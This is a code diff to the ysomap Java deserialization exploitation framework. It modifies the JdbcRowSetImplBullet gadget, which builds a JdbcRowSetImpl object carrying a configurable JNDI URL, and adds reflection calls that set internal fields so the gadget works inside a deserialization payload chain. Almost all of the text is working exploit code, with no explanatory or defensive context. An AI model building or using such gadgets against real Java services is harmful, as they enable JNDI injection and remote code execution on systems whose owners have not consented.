@@ -4,6 +4,9 @@ import com.sun.rowset.JdbcRowSetImpl;
 import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
+import ysomap.core.util.ReflectionHelper;
+
+import java.util.Vector;
 
 /**
  * @author wh1t3P1g
@@ -26,6 +29,15 @@ public class JdbcRowSetImplBullet extends AbstractBullet<JdbcRowSetImpl> {
     public JdbcRowSetImpl getObject() throws Exception {
         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
         jdbcRowSet.setDataSourceName(jndiURL);
+
+        Vector v = new Vector<String>();
+        v.add("");
+        ReflectionHelper.setFieldValue(jdbcRowSet, "fetchDir", 1);
+        ReflectionHelper.setFieldValue(jdbcRowSet, "concurrency", 1);
+        ReflectionHelper.setFieldValue(jdbcRowSet, "rowSetType", 1);
+        ReflectionHelper.setFieldValue(jdbcRowSet, "iMatchColumns", null);
+        ReflectionHelper.setFieldValue(jdbcRowSet, "strMatchColumns", v);
+        ReflectionHelper.setFieldValue(jdbcRowSet, "resBundle", null);
         return jdbcRowSet;
     }
 
